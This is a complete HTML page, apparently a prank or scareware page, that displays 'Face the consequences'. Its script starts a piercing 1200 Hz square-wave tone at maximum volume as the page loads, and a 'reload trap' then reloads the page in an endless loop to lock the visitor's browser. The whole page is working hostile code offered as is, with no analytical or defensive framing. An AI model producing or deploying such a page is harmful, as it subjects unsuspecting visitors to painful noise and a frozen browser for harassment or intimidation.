<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Face the consequences</title>
  <style>
    body {
      display:flex;
      justify-content:center;
      align-items:center;
      min-height:100vh;
      background:black;
      color:red;
      font-family:sans-serif;
      font-size:3em;
    }
  </style>
</head>
<body>
  Face the consequences
  <script>
    // Continuous loud beep
    (function startBeep(){
      try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const amp = ctx.createGain();

        osc.type = 'square';       // harshest tone
        osc.frequency.value = 1200; // piercing pitch (Hz)
        amp.gain.value = 1.0;      // MAX volume (be careful!)

        osc.connect(amp).connect(ctx.destination);
        osc.start();
      } catch (e) {
        console.error('Audio init failed:', e);
      }
    })();

    // Reload trap
    onbeforeunload = function(){ localStorage.x = 1 };
    setTimeout(function(){
      while(1) location.reload(1);
    }, 1000);
  </script>
</body>
</html>
